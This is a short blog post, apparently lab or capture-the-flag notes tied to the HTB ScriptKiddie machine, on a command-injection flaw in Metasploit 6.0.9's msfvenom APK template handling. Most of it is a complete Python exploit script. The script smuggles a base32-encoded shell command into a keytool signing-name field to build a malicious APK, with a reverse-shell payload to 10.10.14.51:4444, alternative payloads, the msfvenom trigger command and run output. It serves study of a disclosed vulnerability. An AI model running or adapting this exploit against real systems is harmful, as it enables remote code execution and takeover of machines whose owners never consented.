---
layout: post
title: Android APK Command Injection via msfvenom template
description: Android APK Command Injection via msfvenom template
summary: Android APK Command Injection via msfvenom template
tags: [linux,foothold,android]
minute: 3
---
## Overview
Attacker can upload malicuous APK file which contains arbritrary commands which then can be used as a template file for `msfvenom` command.

## Versions Tested
* Metasploit 6.0.9

## Steps
* Install jarsigner

```bash
sudo apt install openjdk-11-jdk-headless
```

* Create the following python script

```python
#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b32encode

# Change me
# payload = 'echo "Code execution as $(id)" > /tmp/win'
# payload = 'ping -c 1 10.10.14.51'
# payload = 'bash -i >& /dev/tcp/10.10.14.51/4444 0>&1'
payload = '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.51/4444 0>&1"'

# b32encode to avoid badchars (keytool is picky)
# thanks to @fdellwing for noticing that base64 can sometimes break keytool
# <https://github.com/justinsteven/advisories/issues/2>
payload_b32 = b32encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b32} | base32 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
```

* Create APK file

```bash
➜  exploit python3 create_evil_apk.py 
[+] Manufacturing evil apkfile

[...redacted...]

[+] Done! apkfile is at /tmp/tmp9kymcdg3/evil.apk

[...redacted...]
➜  exploit 
```

* Open netcat listener
* Upload APK file to web app, generate and wait for reverse connection

![](/spindel/assets/Android%20APK%20Command%20Injection%20via%20msfvenom%20template/F7A1C4F0-2911-4E8E-8F52-AD3D081E1FEC.png)

## References
* HTB ScriptKiddie
* [advisories/2020_metasploit_msfvenom_apk_template_cmdi.md at master · justinsteven/advisories · GitHub](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md)
* [Rapid7 Metasploit Framework msfvenom APK Template Command Injection](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/)